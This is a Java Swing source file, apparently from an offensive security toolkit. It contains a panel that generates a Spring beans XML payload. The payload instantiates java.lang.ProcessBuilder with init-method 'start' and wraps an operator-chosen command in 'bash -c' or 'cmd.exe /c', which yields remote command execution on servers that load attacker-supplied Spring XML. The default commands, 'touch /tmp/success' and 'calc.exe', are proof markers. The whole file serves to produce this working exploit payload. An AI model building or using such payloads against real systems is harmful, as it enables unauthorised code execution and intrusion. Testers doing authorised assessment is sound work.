package cc.kiiy.ui;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.awt.event.ActionListener;

public class BeanXmlPanel extends JPanel {
    
    private JTextField commandField;
    private JComboBox<String> osComboBox;
    private JButton generatePayloadButton;
    private JButton copyButton;
    private JTextArea resultArea;
    
    public BeanXmlPanel() {
        super(new BorderLayout(10, 10));
        setBorder(new EmptyBorder(10, 10, 10, 10));
        initComponents();
        setupListeners();
    }
    
    private void initComponents() {
        JPanel configPanel = new JPanel(new GridBagLayout());
        configPanel.setBorder(new TitledBorder("BeanXML Payload 生成"));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.anchor = GridBagConstraints.WEST;
        gbc.fill = GridBagConstraints.HORIZONTAL;
        
        JLabel osLabel = new JLabel("目标操作系统:");
        osLabel.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        gbc.gridx = 0;
        gbc.gridy = 0;
        gbc.weightx = 0;
        configPanel.add(osLabel, gbc);
        
        String[] osTypes = {"Linux/Mac", "Windows"};
        osComboBox = new JComboBox<>(osTypes);
        osComboBox.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        gbc.gridx = 1;
        gbc.weightx = 0.2;
        configPanel.add(osComboBox, gbc);
        
        JLabel cmdLabel = new JLabel("执行命令:");
        cmdLabel.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        gbc.gridx = 2;
        gbc.weightx = 0;
        configPanel.add(cmdLabel, gbc);
        
        commandField = new JTextField("touch /tmp/success", 40);
        commandField.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        gbc.gridx = 3;
        gbc.weightx = 0.8;
        configPanel.add(commandField, gbc);
        
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 5, 0));
        generatePayloadButton = new JButton("生成 XML");
        generatePayloadButton.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        buttonPanel.add(generatePayloadButton);
        
        copyButton = new JButton("复制到剪贴板");
        copyButton.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        buttonPanel.add(copyButton);
        
        gbc.gridx = 0;
        gbc.gridy = 1;
        gbc.gridwidth = 4;
        gbc.weightx = 1.0;
        gbc.fill = GridBagConstraints.NONE;
        gbc.anchor = GridBagConstraints.EAST;
        configPanel.add(buttonPanel, gbc);
        
        resultArea = new JTextArea(15, 50);
        resultArea.setFont(new Font("Consolas", Font.PLAIN, 13));
        resultArea.setEditable(false);
        
        JPanel resultPanel = new JPanel(new BorderLayout(5, 5));
        resultPanel.setBorder(new TitledBorder("生成的 BeanXML"));
        resultPanel.add(new JScrollPane(resultArea), BorderLayout.CENTER);
        
        add(configPanel, BorderLayout.NORTH);
        add(resultPanel, BorderLayout.CENTER);
    }
    
    private void setupListeners() {
        generatePayloadButton.addActionListener(e -> generateXml());
        copyButton.addActionListener(e -> copyToClipboard());
        
        osComboBox.addActionListener(e -> {
            if (osComboBox.getSelectedIndex() == 0) {
                commandField.setText("touch /tmp/success");
            } else {
                commandField.setText("calc.exe");
            }
        });
    }
    
    private void generateXml() {
        String command = commandField.getText().trim();
        if (command.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入要执行的命令！");
            return;
        }
        
        boolean isWindows = osComboBox.getSelectedIndex() == 1;
        StringBuilder xml = new StringBuilder();
        xml.append("<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n");
        xml.append("<beans xmlns=\"http://www.springframework.org/schema/beans\"\n");
        xml.append("    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n");
        xml.append("    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n");
        xml.append("    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n");
        xml.append("        <constructor-arg>\n");
        xml.append("            <list>\n");
        
        if (isWindows) {
            xml.append("                <value>cmd.exe</value>\n");
            xml.append("                <value>/c</value>\n");
        } else {
            xml.append("                <value>bash</value>\n");
            xml.append("                <value>-c</value>\n");
        }
        
        xml.append("                <value><![CDATA[").append(command).append("]]></value>\n");
        xml.append("            </list>\n");
        xml.append("        </constructor-arg>\n");
        xml.append("    </bean>\n");
        xml.append("</beans>");
        
        resultArea.setText(xml.toString());
    }
    
    private void copyToClipboard() {
        String xml = resultArea.getText();
        if (xml.isEmpty()) {
            JOptionPane.showMessageDialog(this, "没有可复制的内容！");
            return;
        }
        
        StringSelection selection = new StringSelection(xml);
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        clipboard.setContents(selection, null);
        JOptionPane.showMessageDialog(this, "已复制到剪贴板！");
    }
}